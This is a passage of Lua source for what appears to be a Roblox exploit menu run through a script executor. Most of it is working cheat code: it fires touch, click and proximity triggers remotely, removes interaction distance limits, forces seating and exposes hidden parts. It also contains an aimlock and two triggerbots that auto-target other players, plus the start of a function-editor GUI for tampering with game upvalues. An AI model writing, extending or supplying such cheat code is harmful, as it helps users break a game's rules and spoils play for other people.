           if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - b.Position).Magnitude < 25 then
           TouchPart(v)

end
end
end
end
end
end)
          else
			   ClosestTouch = false
			   if closesttouch ~= nil then
                  closesttouch:Disconnect()
               end
	end
  end    
})

Function:AddToggle({
	Name = "Loop Fire Closest ClickDetector",
	Default = false,
	Callback = function(ClosestClick)
		if ClosestClick == true then

        if closestclick ~= nil then
                  closestclick:Disconnect()
               end

function ClickPart(Part)
   if Part and game.Players.LocalPlayer.Character then
       fireclickdetector(Part)
   end
end

closestclick = game:GetService("RunService").Stepped:Connect(function()

for i,v in pairs(game.Workspace:GetDescendants()) do
       if v:IsA("ClickDetector") then
          for i,b in pairs(v.Parent:GetChildren()) do
              if b:IsA("BasePart") then
           if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - b.Position).Magnitude < 25 then
           ClickPart(v)

end
end
end
end
end
end)
          else
			   ClosestClick = false
			   if closestclick ~= nil then
                  closestclick:Disconnect()
               end
	end
  end    
})

Function:AddToggle({
	Name = "Loop Fire Closest ProximityPrompt",
	Default = false,
	Callback = function(ClosestProx)
		if ClosestProx == true then

        if closestprox ~= nil then
                  closestprox:Disconnect()
               end

closestprox = game:GetService("RunService").Stepped:Connect(function()

    for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do -- ProximityPrompt can always be in workspace, so not change.
           if v:IsA("BasePart") then -- Detects, is there any part or meshpart to worked.
               if game:GetService("Players").LocalPlayer:DistanceFromCharacter(v.Position) < 25 then -- You actually can do it with distance, but if you not want, then delete it and last 'end'.
                   if v:FindFirstChild("ProximityPrompt") then -- Detects, is proximityprompt in part or meshpart.
                       fireproximityprompt(v) --- Now we firing proximityprompt/s. You can also add near with proximityprompt distance, example fireproximityprompt(v.ProximityPrompt, NUMBER OF DISTANCE)
                   end
               end
           end
       end   
end)
          else
			   ClosestProx = false
			   if closestprox ~= nil then
                  closestprox:Disconnect()
               end
	end
  end    
})

Function:AddToggle({
	Name = "Loop Fire Closest Seat",
	Default = false,
	Callback = function(ClosestSeat)
		if ClosestSeat == true then

        if closestseat ~= nil then
                  closestseat:Disconnect()
               end
        function SitPart(Part)
   if Part and game.Players.LocalPlayer.Character then
       Part:Sit(plr.Character:FindFirstChildOfClass("Humanoid"))
   end
end

closestseat = game:GetService("RunService").Stepped:Connect(function()

for i,v in pairs(game.Workspace:GetDescendants()) do
       if v:IsA("Seat") or v:IsA("VehicleSeat") then
           if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).Magnitude < 25 then
           SitPart(v)

end
end
end
end)
          else
			   ClosestSeat = false
			   if closestseat ~= nil then
                  closestseat:Disconnect()
               end
	end
  end    
})

Function:AddButton({
	Name = "Fire Closest TouchInterest",
	Callback = function()
      	function TouchPart(Part)
   if Part and game.Players.LocalPlayer.Character then
       firetouchinterest(plr.Character[BasePart], Part, 0)
       task.wait()
       firetouchinterest(plr.Character[BasePart], Part, 1)
   end
end
 
for i,v in pairs(game.Workspace:GetDescendants()) do
       if v:IsA("TouchTransmitter") then
          for i,b in pairs(v.Parent:GetChildren()) do
              if b:IsA("BasePart") then
           if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - b.Position).Magnitude < 25 then
           TouchPart(v)

end
end
end
end
end
  	end    
})

Function:AddButton({
	Name = "Fire Closest ClickDetector",
	Callback = function()
      	function ClickPart(Part)
   if Part and game.Players.LocalPlayer.Character then
       fireclickdetector(Part)
   end
end

for i,v in pairs(game.Workspace:GetDescendants()) do
       if v:IsA("BasePart") then
            for i,b in pairs(v:GetDescendants()) do
                if b:IsA("ClickDetector") then
          if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).Magnitude < 25 then
             ClickPart(b)
          end
end
end
end
end
  	end    
})

Function:AddButton({
	Name = "Fire Closest ProximityPrompt",
	Callback = function()
function ProxPart(Part)
   if Part and game.Players.LocalPlayer.Character then
       fireproximityprompt(Part)
   end
end

for i,v in pairs(game.Workspace:GetDescendants()) do
       if v:IsA("BasePart") then
            for i,b in pairs(v:GetDescendants()) do
                if b:IsA("ProximityPrompt") then
          if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).Magnitude < 25 then
             ProxPart(b)
          end
end
end
end
end
  	end    
})

Function:AddButton({
	Name = "Fire Closest Seat",
	Callback = function()
      	function SitPart(Part)
   if Part and game.Players.LocalPlayer.Character then
       Part:Sit(plr.Character:FindFirstChildOfClass("Humanoid"))
   end
end

for i,v in pairs(game.Workspace:GetDescendants()) do
       if v:IsA("Seat") or v:IsA("VehicleSeat") then
           if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).Magnitude < 25 then
           SitPart(v)

end
end
end
  	end    
})

Function:AddButton({
	Name = "Fire All TouchInterests",
	Callback = function()
      	local Root = game.Players.LocalPlayer.Character[BasePart] or game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("BasePart")
	local function Touch(x)
		x = x.FindFirstAncestorWhichIsA(x, "Part")
		if x then
			if firetouchinterest then
				return task.spawn(function()
					firetouchinterest(x, Root, 1, wait() and firetouchinterest(x, Root, 0))
				end)
			end
			x.CFrame = Root.CFrame
		end
	end
	for _, v in ipairs(workspace:GetDescendants()) do
		if v.IsA(v, "TouchTransmitter") then
			Touch(v)
		end
	end
  	end    
})

Function:AddButton({
	Name = "Fire All ClickDetectors",
	Callback = function()
      	for i,v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("ClickDetector") then
				fireclickdetector(v)
			end
		end
  	end    
})

Function:AddButton({
	Name = "Fire All ProximityPrompts",
	Callback = function()
      	for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("ProximityPrompt") then
				fireproximityprompt(v)
			end
		end
  	end    
})

Function:AddButton({
	Name = "Fire All Seats",
	Callback = function()
      	for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("Seat") or v:IsA("VehicleSeat") then
				v:Sit(plr.Character:FindFirstChildOfClass("Humanoid"))
			end
		end
  	end    
})

Function:AddToggle({
	Name = "No ClickDetector Limits",
	Default = false,
	Callback = function(NOClickLimits)
		if NOClickLimits == true then
			   if clickDied ~= nil then
				  clickDied:Disconnect()
			   end	   
               for i,v in pairs(game.Workspace:GetDescendants()) do
		if v:IsA("ClickDetector") then
			v.MaxActivationDistance = math.huge
		end
	end
	clickDied = game:GetService("Workspace").DescendantAdded:Connect(function(clickishere)
       if clickishere:IsA("ClickDetector") then
		  clickishere.MaxActivationDistance = math.huge
	   end
	end)
          else
			   NOClickLimits = false
			   if clickDied ~= nil then
				  clickDied:Disconnect()
			   end
               for i,b in pairs(game.Workspace:GetDescendants()) do
		if b:IsA("ClickDetector") then
			b.MaxActivationDistance = "32"
		end
		end	
	end
  end    
})

Function:AddToggle({
	Name = "No ProximityPrompt Limits",
	Default = false,
	Callback = function(NOProxLimits)
		if NOProxLimits == true then
			   if proxDied ~= nil then
				  proxDied:Disconnect()
			   end	  
               for i,v in pairs(game.Workspace:GetDescendants()) do
		if v:IsA("ProximityPrompt") then
			v.MaxActivationDistance = math.huge
		end
	end
	proxDied = game:GetService("Workspace").DescendantAdded:Connect(function(proxishere)
        if proxishere:IsA("ProximityPrompt") then
		   proxishere.MaxActivationDistance = math.huge
		end	
	end)
          else
			   NOProxLimits = false
			   if proxDied ~= nil then
				  proxDied:Disconnect()
			   end	   
               for i,b in pairs(game.Workspace:GetDescendants()) do
		if b:IsA("ProximityPrompt") then
			b.MaxActivationDistance = "32"
		end
	end
	end
  end    
})

local PromptButtonHoldBegan = nil
Function:AddToggle({
	Name = "Instant Fire ProximityPrompt",
	Default = false,
	Callback = function(InstantProx)
		if InstantProx == true then
               PromptButtonHoldBegan = game:GetService("ProximityPromptService").PromptButtonHoldBegan:Connect(function(prompt)
			   fireproximityprompt(prompt)
		end)
          else
			   InstantProx = false
               if PromptButtonHoldBegan ~= nil then
		PromptButtonHoldBegan:Disconnect()
		PromptButtonHoldBegan = nil
	end
	end
  end    
})

Function:AddToggle({
	Name = "Show Selection ClickDetectors",
	Default = false,
	Callback = function(ShowSCL)
		if ShowSCL == true then
			   if selclick ~= nil then
                  selclick:Disconnect()
			   end
               for _, object in next, game.Workspace:GetDescendants() do
            if object:IsA("ClickDetector") and object.Parent:FindFirstChild("SelectionBox") == nil then
                local selectionbox = Instance.new("SelectionBox", object.Parent)
                selectionbox.Adornee = object.Parent
            end
        end
		selclick = game:GetService("Workspace").DescendantAdded:Connect(function(clicksel)
           if clicksel:IsA("ClickDetector") and clicksel.Parent:FindFirstChild("SelectionBox") == nil then
		      local selectionbox = Instance.new("SelectionBox", clicksel.Parent)
                selectionbox.Adornee = clicksel.Parent
		   end	   
		end)
          else
			   ShowSCL = false
			   if selclick ~= nil then
                  selclick:Disconnect()
			   end
               for _, object in next, game.Workspace:GetDescendants() do
            if object:IsA("ClickDetector") and object.Parent:FindFirstChild("SelectionBox") ~= nil then
                object.Parent:FindFirstChild("SelectionBox"):Destroy()
            end
        end
	end
  end    
})

Function:AddToggle({
	Name = "Show Selection TouchInterests",
	Default = false,
	Callback = function(ShowSCL)
		if ShowSCL == true then
			   if seltouch ~= nil then
                  seltouch:Disconnect()
			   end
               for _, object in next, game.Workspace:GetDescendants() do
            if object:IsA("TouchTransmitter") and object.Parent:FindFirstChild("SelectionBox") == nil then
                local selectionbox = Instance.new("SelectionBox", object.Parent)
                selectionbox.Adornee = object.Parent
            end
        end
		seltouch = game:GetService("Workspace").DescendantAdded:Connect(function(touchsel)
           if touchsel:IsA("TouchTransmitter") and touchsel.Parent:FindFirstChild("SelectionBox") == nil then
		      local selectionbox = Instance.new("SelectionBox", touchsel.Parent)
                selectionbox.Adornee = touchsel.Parent
		   end	   
		end)
          else
			   ShowSCL = false
			   if seltouch ~= nil then
                  seltouch:Disconnect()
			   end
               for _, object in next, game.Workspace:GetDescendants() do
            if object:IsA("TouchTransmitter") and object.Parent:FindFirstChild("SelectionBox") ~= nil then
                object.Parent:FindFirstChild("SelectionBox"):Destroy()
            end
        end
	end
  end    
})

Function:AddToggle({
	Name = "Show Selection ProximityPrompts",
	Default = false,
	Callback = function(ShowSCL)
		if ShowSCL == true then
			   if selprox ~= nil then
                  selprox:Disconnect()
			   end
               for _, object in next, game.Workspace:GetDescendants() do
            if object:IsA("ProximityPrompt") and object.Parent:FindFirstChild("SelectionBox") == nil then
                local selectionbox = Instance.new("SelectionBox", object.Parent)
                selectionbox.Adornee = object.Parent
            end
        end
		selprox = game:GetService("Workspace").DescendantAdded:Connect(function(proxsel)
           if proxsel:IsA("ProximityPrompt") and proxsel.Parent:FindFirstChild("SelectionBox") == nil then
		      local selectionbox = Instance.new("SelectionBox", proxsel.Parent)
                selectionbox.Adornee = proxsel.Parent
		   end	   
		end)
          else
			   ShowSCL = false
			   if selprox ~= nil then
                  selprox:Disconnect()
			   end
               for _, object in next, game.Workspace:GetDescendants() do
            if object:IsA("ProximityPrompt") and object.Parent:FindFirstChild("SelectionBox") ~= nil then
                object.Parent:FindFirstChild("SelectionBox"):Destroy()
            end
        end
	end
  end    
})

Function:AddToggle({
	Name = "Show Selection Seats",
	Default = false,
	Callback = function(ShowSeatPart)
		if ShowSeatPart == true then
			   if selseat ~= nil then
                  selseat:Disconnect()
			   end
               for _, object in next, game.Workspace:GetDescendants() do
            if object:IsA("Seat") and object.Parent:FindFirstChild("SelectionBox") == nil then
                local selectionbox = Instance.new("SelectionBox", object.Parent)
                selectionbox.Adornee = object.Parent
            end
        end
		selseat = game:GetService("Workspace").DescendantAdded:Connect(function(seatsel)
           if seatsel:IsA("Seat") and seatsel.Parent:FindFirstChild("SelectionBox") == nil then
		      local selectionbox = Instance.new("SelectionBox", seatsel.Parent)
                selectionbox.Adornee = seatsel.Parent
		   end	   
		end)
          else
			   ShowSeatPart = false
			   if selseat ~= nil then
                  selseat:Disconnect()
			   end
               for _, object in next, game.Workspace:GetDescendants() do
            if object:IsA("Seat") and object.Parent:FindFirstChild("SelectionBox") ~= nil then
                object.Parent:FindFirstChild("SelectionBox"):Destroy()
            end
        end
	end
  end    
})

Function:AddToggle({
	Name = "Show Selection CanCollideNoclip Parts",
	Default = false,
	Callback = function(sinvisparts)
		if sinvisparts == true then
			  if selcanc ~= nil then
                  selcanc:Disconnect()
			   end
              for _, object in next, game.Workspace:GetDescendants() do
            if object:IsA("BasePart") and object.CanCollide == false and object.Parent:FindFirstChild("SelectionBox") == nil then
                local selectionbox = Instance.new("SelectionBox", object.Parent)
                selectionbox.Adornee = object.Parent
            end
        end
		selcanc = game:GetService("Workspace").DescendantAdded:Connect(function(canc)
           if canc:IsA("BasePart") and canc.CanCollide == false and canc.Parent:FindFirstChild("SelectionBox") == nil then
		      local selectionbox = Instance.new("SelectionBox", canc.Parent)
                selectionbox.Adornee = canc.Parent
		   end
		end)
          else
			   sinvisparts = false
			   if selcanc ~= nil then
                  selcanc:Disconnect()
			   end
               for _, object in next, game.Workspace:GetDescendants() do
            if object:IsA("BasePart") and object.Transparency == 1 and object.Parent:FindFirstChild("SelectionBox") ~= nil then
                object.Parent:FindFirstChild("SelectionBox"):Destroy()
            end
        end
	end
  end    
})

Function:AddToggle({
	Name = "Show Selection Invisible Parts",
	Default = false,
	Callback = function(sinvisparts)
		if sinvisparts == true then
			  if selinvisp ~= nil then
                  selinvisp:Disconnect()
			   end
              for _, object in next, game.Workspace:GetDescendants() do
            if object:IsA("BasePart") and object.Transparency == 1 and object.Parent:FindFirstChild("SelectionBox") == nil then
                local selectionbox = Instance.new("SelectionBox", object.Parent)
                selectionbox.Adornee = object.Parent
            end
        end
		selinvisp = game:GetService("Workspace").DescendantAdded:Connect(function(invissel)
           if invissel:IsA("BasePart") and invissel.Transparency == 1 and invissel.Parent:FindFirstChild("SelectionBox") == nil then
		      local selectionbox = Instance.new("SelectionBox", invissel.Parent)
                selectionbox.Adornee = invissel.Parent
		   end	   
		end)
          else
			   sinvisparts = false
			   if selinvisp ~= nil then
                  selinvisp:Disconnect()
			   end
               for _, object in next, game.Workspace:GetDescendants() do
            if object:IsA("BasePart") and object.Transparency == 1 and object.Parent:FindFirstChild("SelectionBox") ~= nil then
                object.Parent:FindFirstChild("SelectionBox"):Destroy()
            end
        end
		showninParts = {}
	end
  end    
})

Function:AddToggle({
	Name = "Show Invisible Parts",
	Default = false,
	Callback = function(invisparts)
		if invisparts == true then
               for i,v in pairs(game.Workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Transparency == 1 then
			if not table.find(shownParts,v) then
				table.insert(shownParts,v)
			end
			v.Transparency = 0
		end
	end
          else
			   invisparts = false
               for i,v in pairs(shownParts) do
		v.Transparency = 1
	end
	shownParts = {}
	end
  end    
})

Function:AddToggle({
	Name = "Invisible Parts",
	Default = false,
	Callback = function(invisparts)
		if invisparts == true then
               for i,v in pairs(game.Workspace:GetDescendants()) do
		if v:IsA("BasePart") then
			if not table.find(showninvParts,v) then
				table.insert(showninvParts,v)
			end
			v.Transparency = 1
		end
	end
          else
			   invisparts = false
               for i,v in pairs(showninvParts) do
		v.Transparency = 0
	end
	showninvParts = {}
	end
  end    
})

Function:AddToggle({
	Name = "Visible Parts",
	Default = false,
	Callback = function(invisparts)
		if invisparts == true then
               for i,v in pairs(game.Workspace:GetDescendants()) do
		if v:IsA("BasePart") then
			if not table.find(shownvisParts,v) then
				table.insert(shownvisParts,v)
			end
			v.Transparency = 0
		end
	end
          else
			   invisparts = false
	shownvisParts = {}
	end
  end    
})

Function:AddLabel("Overpowered Functions")

Function:AddToggle({
	Name = "AimLock [Hold X]",
	Default = false,
	Callback = function(aimlock)
		if aimlock == true then
              if lockcursorman ~= nil then
                  lockcursorman:Disconnect()
               end
               if unlockcursorman ~= nil then
                  unlockcursorman:Disconnect()
               end
               _G.TeamCheck = false
_G.Sensitivity = 0
_G.CircleSides = 64
_G.CircleColor = Color3.fromRGB(255, 0, 130)
_G.CircleTransparency = 0
_G.CircleRadius = 200
_G.CircleFilled = false
_G.CircleVisible = true
_G.CircleThickness = 1

local FOVCircle = Drawing.new("Circle")
FOVCircle.Position = Vector2.new(MyView.ViewportSize.X / 2, MyView.ViewportSize.Y / 2)
FOVCircle.Radius = _G.CircleRadius
FOVCircle.Filled = _G.CircleFilled
FOVCircle.Color = _G.CircleColor
FOVCircle.Visible = _G.CircleVisible
FOVCircle.Transparency = _G.CircleTransparency
FOVCircle.NumSides = _G.CircleSides
FOVCircle.Thickness = _G.CircleThickness

function FindNearestPlayers()
	local dist = math.huge
	local Target = nil
	for _, v in pairs(game.Players:GetPlayers()) do
		if v ~= plr and v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").Health > 0 and getRoot(v.Character) and v then
			local TheirCharacter = v.Character
			local CharacterRoot, Visible = MyView:WorldToViewportPoint(getRoot(TheirCharacter).Position)
			if Visible then
				local RealMag = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(CharacterRoot.X, CharacterRoot.Y)).Magnitude
				if RealMag < dist and RealMag < FOVCircle.Radius then
					dist = RealMag
					Target = TheirCharacter
				end
			end
		end
	end
	return Target
end

lockcursorman = UIS.InputBegan:Connect(function(Input)
	if Input.KeyCode == Enum.KeyCode.X then
		HoldingM2 = true
		Active = true
		Lock = true
		if Active then
        	local The_Enemy = FindNearestPlayers()
			while HoldingM2 do task.wait(.000001)
				if Lock and The_Enemy ~= nil then
					local Future = getRoot(The_Enemy).CFrame + (getRoot(The_Enemy).Velocity * Epitaph + HeadOffset)
					MyView.CFrame = CFrame.lookAt(MyView.CFrame.Position, Future.Position)
					CursorLock()
				end
			end
		end
	end
end)
unlockcursorman = UIS.InputEnded:Connect(function(Input)
	if Input.KeyCode == Enum.KeyCode.X then
		UnLockCursor()
	end
end)
          else
			   aimlock = false
               Active = false
               HoldingM2 = false
               Lock = false
               if lockcursorman ~= nil then
                  lockcursorman:Disconnect()
               end
               if unlockcursorman ~= nil then
                  unlockcursorman:Disconnect()
               end
               UnLockCursor()
	end
  end    
})

Function:AddToggle({
	Name = "AimLock TeamCheck [Hold X]",
	Default = false,
	Callback = function(aimlock)
		if aimlock == true then
              if lockcursorman ~= nil then
                  lockcursorman:Disconnect()
               end
               if unlockcursorman ~= nil then
                  unlockcursorman:Disconnect()
               end
               _G.TeamCheck = true
_G.Sensitivity = 0
_G.CircleSides = 64
_G.CircleColor = Color3.fromRGB(255, 0, 130)
_G.CircleTransparency = 0
_G.CircleRadius = 200
_G.CircleFilled = false
_G.CircleVisible = true
_G.CircleThickness = 1

local FOVCircle = Drawing.new("Circle")
FOVCircle.Position = Vector2.new(MyView.ViewportSize.X / 2, MyView.ViewportSize.Y / 2)
FOVCircle.Radius = _G.CircleRadius
FOVCircle.Filled = _G.CircleFilled
FOVCircle.Color = _G.CircleColor
FOVCircle.Visible = _G.CircleVisible
FOVCircle.Transparency = _G.CircleTransparency
FOVCircle.NumSides = _G.CircleSides
FOVCircle.Thickness = _G.CircleThickness

function FindNearestPlayers()
	local dist = math.huge
	local Target = nil
	for _, v in pairs(game.Players:GetPlayers()) do
		if v ~= plr and v.TeamColor ~= plr.TeamColor and v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").Health > 0 and getRoot(v.Character) and v then
			local TheirCharacter = v.Character
			local CharacterRoot, Visible = MyView:WorldToViewportPoint(getRoot(TheirCharacter).Position)
			if Visible then
				local RealMag = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(CharacterRoot.X, CharacterRoot.Y)).Magnitude
				if RealMag < dist and RealMag < FOVCircle.Radius then
					dist = RealMag
					Target = TheirCharacter
				end
			end
		end
	end
	return Target
end

lockcursorman = UIS.InputBegan:Connect(function(Input)
	if Input.KeyCode == Enum.KeyCode.X then
		HoldingM2 = true
		Active = true
		Lock = true
		if Active then
        	local The_Enemy = FindNearestPlayers()
			while HoldingM2 do task.wait(.000001)
				if Lock and The_Enemy ~= nil then
					local Future = getRoot(The_Enemy).CFrame + (getRoot(The_Enemy).Velocity * Epitaph + HeadOffset)
					MyView.CFrame = CFrame.lookAt(MyView.CFrame.Position, Future.Position)
					CursorLock()
				end
			end
		end
	end
end)
unlockcursorman = UIS.InputEnded:Connect(function(Input)
	if Input.KeyCode == Enum.KeyCode.X then
		UnLockCursor()
	end
end)
          else
			   aimlock = false
               Active = false
               HoldingM2 = false
               Lock = false
               if lockcursorman ~= nil then
                  lockcursorman:Disconnect()
               end
               if unlockcursorman ~= nil then
                  unlockcursorman:Disconnect()
               end
               UnLockCursor()
	end
  end    
})

Function:AddToggle({
	Name = "TriggerBot Mouse Down-Up",
	Default = false,
	Callback = function(triggermdlol)
		if triggermdlol == true then
           if triggermd ~= nil then
              triggermd:Disconnect()
           end
           local player = game:GetService("Players").LocalPlayer
local mouse = player:GetMouse()
triggermd = game:GetService("RunService").RenderStepped:Connect(function()
            if mouse.Target.Parent:FindFirstChild("Humanoid") and mouse.Target.Parent.Name ~= player.Name then
                local target = game:GetService("Players"):FindFirstChild(mouse.Target.Parent.Name)
                if target.TeamColor ~= player.TeamColor then
                mouse1down() wait() mouse1up()
                end
            end
end)
warn("Triggerbot with mouse1down() and mouse1up() has loaded. You can use this script if other triggerbot not work. This script can work in KRNL and other.")
          else
			   triggermdlol = false
               if triggermd ~= nil then
                  triggermd:Disconnect()
               end
	end
  end    
})

Function:AddToggle({
	Name = "TriggerBot Mouse Press-Release",
	Default = false,
	Callback = function(triggermplol)
		if triggermplol == true then
           if triggermp ~= nil then
              triggermp:Disconnect()
           end
           local player = game:GetService("Players").LocalPlayer
local mouse = player:GetMouse()
triggermp = game:GetService("RunService").RenderStepped:Connect(function()
            if mouse.Target.Parent:FindFirstChild("Humanoid") and mouse.Target.Parent.Name ~= player.Name then
                local target = game:GetService("Players"):FindFirstChild(mouse.Target.Parent.Name)
                if target.TeamColor ~= player.TeamColor then
                mouse1press() wait() mouse1release()
                end
            end
end)
warn("Triggerbot with mouse1press() and mouse1release() has loaded. You can use this script, if other triggerbot not work. This triggetbot can work in synapse x and other.")
          else
			   triggermplol = false
               if triggermp ~= nil then
              triggermp:Disconnect()
           end
	end
  end    
})

Function:AddButton({
	Name = "Function Editor",
	Callback = function()
      	local gui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local funcEditor = Instance.new("Frame")
local const = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local funcs = Instance.new("ScrollingFrame")
local UIListLayout_2 = Instance.new("UIListLayout")
local info = Instance.new("Frame")
local f1 = Instance.new("Frame")
local index = Instance.new("TextLabel")
local type_1 = Instance.new("TextLabel")
local action = Instance.new("TextLabel")
local f2 = Instance.new("Frame")
local index_2 = Instance.new("TextLabel")
local type_2 = Instance.new("TextLabel")
local action_2 = Instance.new("TextLabel")
local f3 = Instance.new("Frame")
local index_3 = Instance.new("TextLabel")
local type_3 = Instance.new("TextLabel")
local action_3 = Instance.new("TextLabel")
local up = Instance.new("ScrollingFrame")
local UIListLayout_3 = Instance.new("UIListLayout")
local hide = Instance.new("TextButton")
local mainFunc = Instance.new("TextButton")
local upFunc = Instance.new("TextButton")
local clearFuncEditor = Instance.new("TextButton")
local FuncEditorButton = Instance.new("TextButton")
local ExplorerButton = Instance.new("TextButton")
local Explorer = Instance.new("Frame")
local editFrame = Instance.new("Frame")
local title = Instance.new("TextLabel")
local confirm = Instance.new("TextButton")
local cancel = Instance.new("TextButton")
local constantGUIelements = Instance.new("TextLabel")
local previousValue = Instance.new("TextLabel")
local constantGUIelements_2 = Instance.new("TextLabel")
local newValue = Instance.new("TextBox")
local number = Instance.new("TextButton")
local bool = Instance.new("TextButton")
local stringV = Instance.new("TextButton")
local constantGUIelements_3 = Instance.new("TextLabel")
local editWithCode = Instance.new("TextButton")

--Properties:

gui.Name = "gui"
gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false

main.Name = "main"
main.Parent = gui
main.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
main.BorderColor3 = Color3.fromRGB(50, 50, 50)
main.Position = UDim2.new(0.086956501, 0, 0.124780312, 0)
main.Size = UDim2.new(0, 900, 0, 450)

funcEditor.Name = "funcEditor"
funcEditor.Parent = main
funcEditor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
funcEditor.BackgroundTransparency = 1.000
funcEditor.Size = UDim2.new(1, 0, 1, 0)

const.Name = "const"
const.Parent = funcEditor
const.Active = true
const.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
const.BorderColor3 = Color3.fromRGB(255, 255, 255)
const.Position = UDim2.new(0, 300, 0, 55)
const.Size = UDim2.new(0, 300, 1, -55)
const.CanvasSize = UDim2.new(0, 0, 10, 0)
const.ScrollBarThickness = 0

UIListLayout.Parent = const
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

funcs.Name = "funcs"
funcs.Parent = funcEditor
funcs.Active = true
funcs.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
funcs.BorderColor3 = Color3.fromRGB(255, 255, 255)
funcs.Position = UDim2.new(0, 600, 0, 55)
funcs.Size = UDim2.new(0, 300, 1, -55)
funcs.CanvasSize = UDim2.new(0, 0, 10, 0)
funcs.ScrollBarThickness = 0

UIListLayout_2.Parent = funcs
UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder

info.Name = "info"
info.Parent = funcEditor
info.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
info.BorderColor3 = Color3.fromRGB(255, 255, 255)
info.Position = UDim2.new(0, 0, 0, 35)
info.Size = UDim2.new(1, 0, 0, 20)

f1.Name = "f1"
f1.Parent = info
f1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
f1.BackgroundTransparency = 1.000
f1.Size = UDim2.new(0, 300, 1, 0)

index.Name = "index"
index.Parent = f1
index.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
index.BackgroundTransparency = 1.000
index.Size = UDim2.new(0, 40, 1, 0)
index.Font = Enum.Font.SourceSans
index.Text = "index"
index.TextColor3 = Color3.fromRGB(255, 255, 255)
index.TextSize = 14.000

type_1.Name = "type"
type_1.Parent = f1
type_1.AnchorPoint = Vector2.new(0.5, 0.5)
type_1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
type_1.BackgroundTransparency = 1.000
type_1.Position = UDim2.new(0.5, 0, 0.5, 0)
type_1.Size = UDim2.new(0, 40, 0, 10)
type_1.Font = Enum.Font.SourceSans
type_1.Text = "Upvalues"
type_1.TextColor3 = Color3.fromRGB(255, 255, 255)
type_1.TextSize = 14.000

action.Name = "action"
action.Parent = f1
action.AnchorPoint = Vector2.new(1, 0)
action.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
action.BackgroundTransparency = 1.000
action.Position = UDim2.new(1, 0, 0, 0)
action.Size = UDim2.new(0, 40, 1, 0)
action.Font = Enum.Font.SourceSans
action.Text = "action"
action.TextColor3 = Color3.fromRGB(255, 255, 255)
action.TextSize = 14.000

f2.Name = "f2"
f2.Parent = info
f2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
f2.BackgroundTransparency = 1.000
f2.Position = UDim2.new(0, 300, 0, 0)
f2.Size = UDim2.new(0, 300, 1, 0)

index_2.Name = "index"
index_2.Parent = f2
index_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
index_2.BackgroundTransparency = 1.000
index_2.Size = UDim2.new(0, 40, 1, 0)
index_2.Font = Enum.Font.SourceSans
index_2.Text = "index"
index_2.TextColor3 = Color3.fromRGB(255, 255, 255)
index_2.TextSize = 14.000

type_2.Name = "type"
type_2.Parent = f2
type_2.AnchorPoint = Vector2.new(0.5, 0.5)
type_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
type_2.BackgroundTransparency = 1.000
type_2.Position = UDim2.new(0.5, 0, 0.5, 0)
type_2.Size = UDim2.new(0, 40, 0, 10)
type_2.Font = Enum.Font.SourceSans
type_2.Text = "Constants"
type_2.TextColor3 = Color3.fromRGB(255, 255, 255)
type_2.TextSize = 14.000

action_2.Name = "action"
action_2.Parent = f2
action_2.AnchorPoint = Vector2.new(1, 0)
action_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
action_2.BackgroundTransparency = 1.000
action_2.Position = UDim2.new(1, 0, 0, 0)
action_2.Size = UDim2.new(0, 40, 1, 0)
action_2.Font = Enum.Font.SourceSans
action_2.Text = "action"
action_2.TextColor3 = Color3.fromRGB(255, 255, 255)
action_2.TextSize = 14.000

f3.Name = "f3"
f3.Parent = info
f3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
f3.BackgroundTransparency = 1.000
f3.Position = UDim2.new(0, 600, 0, 0)
f3.Size = UDim2.new(0, 300, 1, 0)

index_3.Name = "index"
index_3.Parent = f3
index_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
index_3.BackgroundTransparency = 1.000
index_3.Size = UDim2.new(0, 40, 1, 0)
index_3.Font = Enum.Font.SourceSans
index_3.Text = "index"
index_3.TextColor3 = Color3.fromRGB(255, 255, 255)
index_3.TextSize = 14.000

type_3.Name = "type"
type_3.Parent = f3
type_3.AnchorPoint = Vector2.new(0.5, 0.5)
type_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
type_3.BackgroundTransparency = 1.000
type_3.Position = UDim2.new(0.5, 0, 0.5, 0)
type_3.Size = UDim2.new(0, 40, 0, 10)
type_3.Font = Enum.Font.SourceSans
type_3.Text = "Functions/Protos"
type_3.TextColor3 = Color3.fromRGB(255, 255, 255)
type_3.TextSize = 14.000

action_3.Name = "action"
action_3.Parent = f3
action_3.AnchorPoint = Vector2.new(1, 0)
action_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
